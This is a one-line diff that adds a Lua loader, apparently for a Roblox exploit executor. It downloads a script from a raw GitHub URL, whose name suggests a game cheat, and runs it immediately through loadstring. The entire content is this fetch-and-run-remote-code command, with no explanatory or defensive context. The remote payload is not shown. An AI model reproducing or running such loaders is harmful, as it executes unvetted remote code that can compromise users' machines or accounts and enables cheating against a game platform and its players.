@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/x15-1-speed-keyboard-escape-candy-chocol-spam3-og54uxncfc1o6x.lua"))()
